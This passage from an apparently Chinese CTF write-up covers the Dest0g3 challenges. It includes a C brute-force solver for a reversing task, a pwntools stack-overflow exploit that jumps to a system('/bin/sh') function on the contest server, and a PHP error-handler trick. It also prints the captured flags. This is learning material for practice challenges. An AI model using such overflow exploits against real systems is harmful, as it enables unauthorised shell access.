class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-A8h]</span><br>  <span class="hljs-type">char</span> enc[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-A0h]</span><br>  <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  *(_QWORD *)str = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">8</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">16</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">24</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">32</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">40</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">48</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">56</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">64</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">72</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">80</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">88</span>] = <span class="hljs-number">0LL</span>;<br>  *(_DWORD *)&amp;str[<span class="hljs-number">96</span>] = <span class="hljs-number">0</span>;<br>  *(_QWORD *)enc = <span class="hljs-number">0x9F8E7A1CC6486497</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">8</span>] = <span class="hljs-number">0x69EEF382E760BD46</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">16</span>] = <span class="hljs-number">0xB9C017E2E30EF749</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">24</span>] = <span class="hljs-number">0x98410148A430392C</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">32</span>] = <span class="hljs-number">0xE80E7411E5B5A939</span>LL;<br>  *(_DWORD *)&amp;enc[<span class="hljs-number">40</span>] = <span class="hljs-number">-1517552212</span>;<br>  enc[<span class="hljs-number">44</span>] = <span class="hljs-number">109</span>;<br>  fwrite(<span class="hljs-string">&quot;input: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">7uLL</span>, <span class="hljs-built_in">stdout</span>);<br>  fgets(str, <span class="hljs-number">46</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(str) != <span class="hljs-number">45</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">44</span>; ++i )<br>  &#123;<br>    v1 = <span class="hljs-number">23</span> * str[i];<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的数据初始化一部分放在了代码里面，对于enc变量，我们可以运行程序然后从内存里dump出来。这里面又是DWORD又是BYTE又是QWORD，还有负数在里面，自己写很有可能出问题，所以选择从内存中dump。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7fffffffdf10</span>: <span class="hljs-number">0</span>x97    <span class="hljs-number">0</span>x64    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>xc6    <span class="hljs-number">0</span>x1c    <span class="hljs-number">0</span>x7a    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x9f<br><span class="hljs-attribute">0x7fffffffdf18</span>: <span class="hljs-number">0</span>x46    <span class="hljs-number">0</span>xbd    <span class="hljs-number">0</span>x60    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x82    <span class="hljs-number">0</span>xf3    <span class="hljs-number">0</span>xee    <span class="hljs-number">0</span>x69<br><span class="hljs-attribute">0x7fffffffdf20</span>: <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe3    <span class="hljs-number">0</span>xe2    <span class="hljs-number">0</span>x17    <span class="hljs-number">0</span>xc0    <span class="hljs-number">0</span>xb9<br><span class="hljs-attribute">0x7fffffffdf28</span>: <span class="hljs-number">0</span>x2c    <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>xa4    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x41    <span class="hljs-number">0</span>x98<br><span class="hljs-attribute">0x7fffffffdf30</span>: <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xb5    <span class="hljs-number">0</span>xe5    <span class="hljs-number">0</span>x11    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe8<br><span class="hljs-attribute">0x7fffffffdf38</span>: <span class="hljs-number">0</span>xac    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x8b    <span class="hljs-number">0</span>xa5    <span class="hljs-number">0</span>x6d <br></code></pre></td></tr></table></figure><p>x直接就在文件里面，直接找出来就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br></code></pre></td></tr></table></figure><p>这里有一个BYTE转换，实际上v1是int类型的，这就丢数据了。我们逆向过程不太能解。由于这个题目数据前后没有关联性，所以可以采用爆破的方式，复杂度为O(n)，是可以爆破的，也就字符集*45的大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br><span class="hljs-type">char</span> x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>,<br>            <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0x20</span>; i &lt;= <span class="hljs-number">0x7e</span>; i++) &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span>*i;<br>            <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (BYTE)v1 + x[index] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) == enc[index] )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index ++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3f82cd79-da3-04-aa0a5b3e445c&#125;</span><br></code></pre></td></tr></table></figure><p>其实那个左移31+24位可以直接去掉了，unsigned int也是4字节的，4字节一共才32位，所以前面和后面的那两个位移就是0，可以去掉。</p><p>嗯…但是跑出来的结果好像不太对，少了一部分的数据。看起来是数据类型的问题。主要是这个char他的正负有点难搞。最后统一了一下判断的格式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br>BYTE x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>,<br>            <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>,<br>            <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0x0</span>; i &lt;= <span class="hljs-number">0xff</span>; i++)<br>        &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span> * i;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)((BYTE)v1 + x[index]) == (<span class="hljs-type">char</span>)(enc[index]))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="ez_arrch"><a class="markdownIt-Anchor" href="#ez_arrch"></a> ez_arrch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_968</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [xsp+10h] [xbp+10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, you can exploit it now.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编能看到这个函数，这里就存在一个栈溢出。接下来就是看看用什么溢出的方式了。</p><p>翻二进制数据的时候发现了一个“/bin/sh”的字符串，加上程序提供了system这个函数，所以想通过这个方式来进行溢出。</p><p>当我跟随这个字符串的时候，发现他是在另外一个函数里面的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">000000000000093</span>C ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000000093</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000000093</span>C                 STP             X29, X30, [SP,#<span class="hljs-number">-0x10</span>]!<br>.text:<span class="hljs-number">0000000000000940</span>                 MOV             X29, SP<br>.text:<span class="hljs-number">0000000000000944</span>                 ADRL            X0, aOkYouGetIt ; <span class="hljs-string">&quot;OK, you get it !&quot;</span><br>.text:<span class="hljs-number">000000000000094</span>C                 BL              .<span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000000950</span>                 ADRL            X0, aBinSh ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">0000000000000958</span>                 BL              .system<br>.text:<span class="hljs-number">000000000000095</span>C                 NOP<br>.text:<span class="hljs-number">0000000000000960</span>                 LDP             X29, X30, [SP],#<span class="hljs-number">0x10</span><br>.text:<span class="hljs-number">0000000000000964</span>                 RET<br>.text:<span class="hljs-number">0000000000000964</span> ; &#125; <span class="hljs-comment">// starts at 93C</span><br></code></pre></td></tr></table></figure><p>那么我们直接跳这个函数就行了，不需要再用system+参数了。而且我看了看system的地址好像也挺奇怪的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28099</span>)<br>func_addr = <span class="hljs-number">0x4000000000</span> + <span class="hljs-number">0x93c</span><br>r.send(pwn.p64(func_addr)*<span class="hljs-number">10</span>)<br>r.interactive()<br><br><span class="hljs-comment"># Dest0g3&#123;e5df9fec-e7cb-4f27-9c49-62f1d260395d&#125;</span><br></code></pre></td></tr></table></figure><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h2><p>这题网上直接有解，由于我本身对Web不太熟悉，这里我只是运气好碰上了。</p><p>这里给出地址：</p><p><a href="https://blog.csdn.net/fmyyy1/article/details/117256082">https://blog.csdn.net/fmyyy1/article/details/117256082</a></p><h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">fl4g</span>) &#123;<br>        <span class="hljs-title">print</span> $<span class="hljs-title">fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>主要就是要来触发这个set_error_handler，所以上传一个语法错误就行了。这里传的是一个数组。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;aa4f0051<span class="hljs-string">-414</span>d<span class="hljs-string">-46</span>bf-ab12<span class="hljs-string">-599</span>c5596c8e4&#125;<br></code></pre></td></tr></table></figure><h1 id="未完成"><a class="markdownIt-Anchor" href="#未完成"></a> 未完成</h1><h2 id="bag"><a class="markdownIt-Anchor" href="#bag"></a> Bag</h2><p>由于源程序中的数据占了很大一部分，这里的代码我自己进行了修改，把数据采用生成的方式来表示了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>message = bytes_to_long(flag[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>])<br>Baglenth=<span class="hljs-number">286</span><br><span class="hljs-comment"># 下面的代码经过了修改</span><br>Bag=[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(Bag) &lt;= Baglenth:<br>    Bag.append(Bag[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>)<br><br>Bag=Bag[::-<span class="hljs-number">1</span>]<br>m=<span class="hljs-number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span><br>w=<span class="hljs-number">274062421102700155372289583695782343443</span><br><span class="hljs-keyword">assert</span> 